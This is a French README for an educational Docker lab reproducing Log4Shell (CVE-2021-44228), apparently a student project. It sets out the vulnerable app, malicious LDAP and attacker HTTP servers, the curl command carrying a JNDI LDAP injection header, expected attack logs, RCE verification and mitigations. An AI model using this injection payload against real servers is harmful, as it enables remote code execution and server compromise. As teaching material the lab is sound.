🔥 Lab DIABLE – Log4Shell (CVE‑2021‑44228)
Version : 1.1
Auteur : Farah Zerzeri
Projet : DIABLE v3.0 – DSI ISFA 2025‑2026
Technologies : Docker, Spring Boot, Log4j, FarahSec, Flask, HTML
Difficulté : Avancé
Type : Remote Code Execution (RCE)

📋 Description
Ce laboratoire pédagogique reproduit de manière contrôlée et sécurisée la vulnérabilité Log4Shell (CVE‑2021‑44228) dans un environnement Docker complet.
Il permet d’explorer :

le fonctionnement interne de Log4j
les attaques JNDI / LDAP
les mécanismes d’exécution de code à distance (RCE)
une chaîne d’exploitation complète, incluant :

une application vulnérable
un serveur LDAP malveillant
un serveur HTTP attaquant
l’exécution d’un payload Java injecté


une interface pédagogique Flask permettant de comprendre et visualiser l’attaque


🎯 Objectifs pédagogiques

Comprendre Log4Shell et ses impacts en cybersécurité
Étudier l’injection via JNDI
Observer un échange LDAP malveillant
Déployer un environnement d’attaque complet sous Docker
Déclencher un vrai RCE et en observer les conséquences
Explorer les stratégies de mitigation standards


🧱 Architecture du lab
Le lab repose sur 4 composants principaux :
1️⃣ Application vulnérable (Spring Boot)

Log4j 2.14.1
Endpoint vulnérable : /api/search
Journalisation des headers → vecteur d’exploitation

2️⃣ Serveur LDAP malveillant (FarahSec)

Interprète la requête JNDI
Renvoie une référence HTTP pointant vers le payload

3️⃣ Serveur HTTP attaquant

Basé sur python3 -m http.server
Héberge :

Exploit.class
Rev.class



4️⃣ Interface pédagogique (Flask)

Écrans :

login
dashboard
quiz
cours théorique
démo Log4Shell




📂 Structure du projet
log4shell-dockerlab-main/
│
├── docker-compose.yml
├── README.md
│
├── attacker-webserver/
│   ├── Exploit.java
│   ├── Exploit.class
│   ├── Rev.java
│   └── Rev.class
│
├── log4shell-vulnerable-app/
│   ├── Dockerfile
│   ├── build.gradle
│   └── src/main/java/...
│
├── farahsec/
│   ├── Dockerfile
│   └── src/...
│
└── web-interface/
    ├── app.py
    └── templates/
        ├── index.html
        ├── dashboard.html
        ├── login.html
        ├── learn.html
        ├── quiz.html
        └── professor.html


⚙️ Prérequis

Docker & Docker Compose
Python 3
Java JDK 8
2 Go de RAM minimum


🚀 Installation & Lancement
1️⃣ Cloner le projet
Shellgit clone <repo>cd log4shell-dockerlab-mainAfficher plus de lignes
Variables de ports configurables via `.env` :

LAB_PORT=5000
APP_PORT=5000
VULN_HOST_PORT=8080
VULNERABLE_PORT=8080
LDAP_HOST_PORT=1389
LDAP_PORT=1389
ATTACKER_WEB_HOST_PORT=8888
ATTACKER_HTTP_PORT=8888

2️⃣ Démarrer l’environnement Docker
Shelldocker compose up --build -dAfficher plus de lignes
Containers créés :

farah-log4shell-vulnerable-app
farah-log4shell-ldap

3️⃣ Serveur HTTP attaquant
Le service `attacker-webserver` est demarre automatiquement par Docker Compose.

🌐 Accès aux services

Service          URL / Port hote
Web vulnérable   http://localhost:${VULN_HOST_PORT}
Interface Flask  http://localhost:${LAB_PORT}
Serveur LDAP     localhost:${LDAP_HOST_PORT}
HTTP attaquant   http://localhost:${ATTACKER_WEB_HOST_PORT}

💣 Exploitation Log4Shell
Payload d'attaque
curl -H 'X-Api-Version: ${jndi:ldap://<LDAP_HOST>:<LDAP_PORT>/Exploit}' \
     http://<TARGET_HOST>:<TARGET_PORT>/api/search

Exemple
curl -H 'X-Api-Version: ${jndi:ldap://ldap:1389/Exploit}' \
     http://vulnerable:8080/api/search

🔍 Observation de l’attaque
Logs LDAP
Send LDAP reference result for Exploit redirecting to http://attacker-webserver:8888/Exploit.class

Logs HTTP attaquant
GET /Exploit.class HTTP/1.1


🧨 Vérification du RCE
Shelldocker exec farah-log4shell-vulnerable-app ls /tmpAfficher plus de lignes
Résultat attendu
log4shell-pwned

→ Confirme l’exécution de code à distance.

🧠 Fonctionnement interne (résumé)

L’utilisateur envoie un header contenant une chaîne JNDI
Log4j interprète automatiquement la valeur
Une requête LDAP part vers le serveur malveillant
Le serveur LDAP renvoie une URL vers un bytecode Java
L’application télécharge la .class
La JVM charge le code
Le payload s’exécute → RCE


📚 Théorie essentielle


Log4Shell permet :

RCE
Exfiltration de données
Compromission totale du serveur



Versions vulnérables :
Log4j 2.0 → 2.14.1



🛡️ Mitigations recommandées

Mettre à jour Log4j en 2.17+
Désactiver JNDI
Filtrer les entrées utilisateur
Utiliser un WAF (règles dédiées Log4Shell)
Surveiller les accès et logs


🧪 Interface pédagogique Flask
Contenu inclus :

Simulation de login
Cours interactifs
Quiz cybersécurité
Dashboard étudiant
Démonstration guidée de Log4Shell
Scénarisation de l’attaque

Objectif : rendre la vulnérabilité accessible et compréhensible pour tous.

📊 Statistiques du lab

3 containers Docker
1 interface pédagogique
2 payloads Java
RCE opérationnel
Lab entièrement reproductible


⚠️ Disclaimer
Ce laboratoire contient des vulnérabilités intentionnelles.
Usage strictement pédagogique.
Ne jamais déployer en production.

👩‍💻 Auteur
Farah Zerzeri
Cybersecurity Engineer Student
DSI ISFA – Promotion 2025‑2026
Projet DIABLE v3.0
